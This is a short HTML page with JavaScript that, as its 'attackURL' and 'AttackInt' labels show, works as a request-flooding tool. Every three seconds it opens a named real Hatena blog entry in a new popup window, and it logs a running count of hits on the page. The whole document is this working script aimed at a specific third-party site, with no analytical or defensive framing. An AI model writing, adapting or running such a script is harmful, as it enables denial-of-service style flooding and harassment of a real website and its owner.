<script>
var attackURL='https://sirakabaararagi.hatenablog.com/entry/2021/11/17/142613';
var interval=3000;
</script>

<script>
var txt ='<tt>'
        +'<br>AttackURL：'+attackURL
        +'<br>AttackInt：'+(interval/1000)+'秒'
        +'</tt>'
        ;
document.write(txt);
</script>

<script>
var i=0;
function zp(i){if(i<1000){return ('00'+i).slice(-3);}else{return i;}}
function tt(att){return '<tt style="font-size:xx-small;'+att+'">';}
  
window.setInterval(function(){
  if(i==0){document.write(txt+'<br>');}
  
  window.open(attackURL,null,'top=0,left=0,width=100,height=100');
  
  i++;
  if(i%100==1){document.write(tt("color:red;")+(i-1)+'</tt><br>');}
  document.write(tt()+zp(i)+' '+'</tt>');
  if(i%25==0){document.write('<br>');}  
  scrollTo(0,i*10);
}, interval);
</script>
